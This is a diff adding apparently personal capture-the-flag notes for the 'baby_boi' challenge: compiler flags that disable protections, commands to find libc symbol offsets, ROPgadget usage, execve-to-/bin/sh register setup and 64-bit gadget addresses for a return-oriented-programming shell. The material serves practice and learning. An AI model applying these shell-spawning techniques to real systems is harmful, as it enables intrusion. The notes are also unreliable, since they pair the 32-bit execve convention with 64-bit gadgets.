@@ -1,0 +1,40 @@
+gcc baby_boi.c -o baby_boi -fno-stack-protector -no-pie
+
+https://blog.vero.site/post/baby-boi
+https://f3real.github.io/hackable_ca_easyROP.html
+
+
+/usr/lib32/libc.so
+
+readelf -s libc-2.27.so | grep ' printf@'
+
+readelf -s /usr/lib32/libc.so | grep ' printf@'
+
+
+whereis libc.so.6
+libc.so.6: /usr/lib/x86_64-linux-gnu/libc.so.6 /usr/lib32/libc.so.6
+
+
+└─$ whereis libc.so.
+libc.so.6: /usr/lib/x86_64-linux-gnu/libc.so.6 /usr/lib32/libc.so.6
+
+readelf -s /usr/lib32/libc.so.6 | grep ' printf@'
+  1768: 000574f0    45 FUNC    GLOBAL DEFAULT   15 printf@@GLIBC_2.0
+  
+  
+ROPgadget --binary=/usr/lib/x86_64-linux-gnu/libc.so.6 > gadgets.txt
+
+
+To get execve syscall we need following arguments:
+
+EAX      0x0b      //identifies execve syscall
+EBX      /bin/sh
+ECX      0
+EDX      0
+
+
+0x000000000003f928 : pop rax ; ret
+0x0000000000027c3d : pop rdi ; ret
+0x00000000000caa2d : pop rdx ; ret
+0x000000000002940f : pop rsi ; ret
+
